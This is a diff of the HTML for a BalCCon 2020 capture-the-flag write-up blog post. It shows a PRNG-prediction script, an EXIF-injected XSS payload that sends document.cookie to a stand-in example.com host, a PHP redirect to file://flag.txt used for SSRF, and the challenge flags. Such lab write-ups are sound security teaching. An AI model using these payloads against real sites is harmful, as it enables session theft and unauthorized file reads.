-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 
 <span style="color:#f92672">import</span> datetime
 <span style="color:#f92672">import</span> os
@@ -442,63 +262,8 @@ app <span style="color:#f92672">=</span> Flask(__name__)
 <span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
     app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5002</span>)
 
-</code></pre></td></tr></table>
-</div>
-</div><p>The random number generation in not actually random. The script which extracts the flag:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random
+</code></pre></div><p>The random number generation in not actually random. The script which extracts the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random
 <span style="color:#f92672">import</span> string
 <span style="color:#f92672">import</span> time
 <span style="color:#f92672">import</span> calendar
@@ -547,18 +312,9 @@ r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</sp
 bs <span style="color:#f92672">=</span> bs4<span style="color:#f92672">.</span>BeautifulSoup(r<span style="color:#f92672">.</span>text,<span style="color:#e6db74">&#39;html.parser&#39;</span>)
 <span style="color:#66d9ef">for</span> viewing_id <span style="color:#f92672">in</span> bs<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;a&#39;</span>):
   check_id(viewing_id[<span style="color:#e6db74">&#39;href&#39;</span>][<span style="color:#ae81ff">6</span>:])
-</code></pre></td></tr></table>
-</div>
-</div><p>And the flag is:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{numb3rs_from_PRNG_are_n0t_really_rand0m}
-</code></pre></td></tr></table>
-</div>
-</div><hr>
+</code></pre></div><p>And the flag is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{numb3rs_from_PRNG_are_n0t_really_rand0m}
+</code></pre></div><hr>
 <h2 id="webimgr">web/Imgr<a class="anchor" href="#webimgr">#</a></h2>
 <blockquote>
 <p>Look at this nice new Social Media application. You can only view your own profile, since it is still in the very early development phase, but it is the up and coming social networking platform. P.S. If you see something strange, let developers know! <a href="https://imgr.pwn.institute">https://imgr.pwn.institute</a></p>
@@ -568,84 +324,74 @@ bs <span style="color:#f92672">=</span> bs4<span style="color:#f92672">.</span>B
 <p><img src="/ctf-balccon-2020/3.png" alt=""></p>
 <p>Editing the picture exif data we can inject XSS and send that url to the devs.</p>
 <p>XSS payload:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;new Image().src=&#39;https://example.com/?c=%27+document.cookie&lt;/script&gt;
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">flag=BCTF{n3v3r_pUbl15h_Unf1n15h3d_p4ge5}
-</code></pre></td></tr></table>
-</div>
-</div><hr>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;new Image().src=&#39;https://example.com/?c=%27+document.cookie&lt;/script&gt;
+</code></pre></div><p>Flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">flag=BCTF{n3v3r_pUbl15h_Unf1n15h3d_p4ge5}
+</code></pre></div><hr>
 <h2 id="weblet-me-see">web/Let Me See<a class="anchor" href="#weblet-me-see">#</a></h2>
 <blockquote>
 <p>This service lets you see the source code of your website: <a href="https://let-me-see.pwn.institute">https://let-me-see.pwn.institute</a></p>
 </blockquote>
 <p><img src="/ctf-balccon-2020/4.png" alt=""></p>
 <p>This is a SSRF challenge, host this file:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php
 header(&#34;Location: file://flag.txt&#34;);
 ?&gt;
-</code></pre></td></tr></table>
+</code></pre></div><p>and open it with the app:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{tricky_curl_redirect_to_file_protocol}
+</code></pre></div>
+
+
+
+
+
+
+<div class="social-icons">
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="Twitter"
+         href="https://twitter.com/ajdintrejic"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="twitter"></i>
+
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="GitHub"
+         href="https://github.com/ajdintrejic"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="github"></i>
+
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="RSS"
+         href="/index.xml"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="rss"></i>
+
+      </a>
+    
+     
 </div>
-</div><p>and open it with the app:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">BCTF{tricky_curl_redirect_to_file_protocol}
-</code></pre></td></tr></table>
-</div>
-</div>
-
-		</div>
-
-		<div class="post-tags">
-			
-				
-			
-		</div>
-		</div>
-	<div class="footer wrapper">
-	<nav class="nav">
-		<div> © All rights reserved | <a href="https://ajdin.io/privacy/">Privacy</a> | 
-                <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
-	</nav>
-</div>
 
 
 
-<script>feather.replace()</script>
-<script src="cookieconsent.js"></script>
+            </div><footer id="footer">
+    <p>  © 2020</p>
+</footer>
+<script src="https://unpkg.com/feather-icons"></script>
 <script>
-    new CookiesEuBanner(function () {
-        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-        
-	ga('set', 'anonymizeIp', true);
-        ga('create', 'UA-165836726-1', 'auto');
-        ga('send', 'pageview');
-    });
+  feather.replace()
 </script>
-</body>
+</div>
+    </body>
 </html>
